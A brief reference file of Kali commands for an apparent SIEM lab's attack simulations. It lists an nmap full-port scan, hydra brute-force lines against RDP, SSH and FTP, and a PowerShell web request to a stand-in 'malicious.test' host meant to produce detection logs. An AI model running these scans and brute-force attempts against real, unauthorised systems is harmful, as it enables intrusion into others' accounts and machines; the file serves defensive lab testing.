# Kali Attack Commands Reference

This file documents all the commands used in the SEIM Lab attack simulations.

---

## 1. Nmap Reconnaissance

Scan target host for open ports, OS, and service versions:

```bash
nmap -sS -p- -A -T4 <TARGET_IP> -oA nmap_scan
2. RDP/SSH Brute Force

Simulate brute-force login attempts:

hydra -L users.txt -P passwords.txt <WINDOWS_VM_IP> rdp -V
hydra -L users.txt -P passwords.txt <TARGET_IP> ssh -V
3. SMB / FTP Testing

Check SMB shares and FTP login:

smbclient -L //<TARGET_IP>/ -U username
hydra -l user -P passwords.txt ftp://<TARGET_IP>

4. PowerShell / Windows Simulation

Trigger suspicious activity:

powershell -Command "Invoke-WebRequest http://malicious.test"


Generates PowerShell network logs for detection

5. Connectivity Tests
ping <TARGET_IP>
traceroute <TARGET_IP>
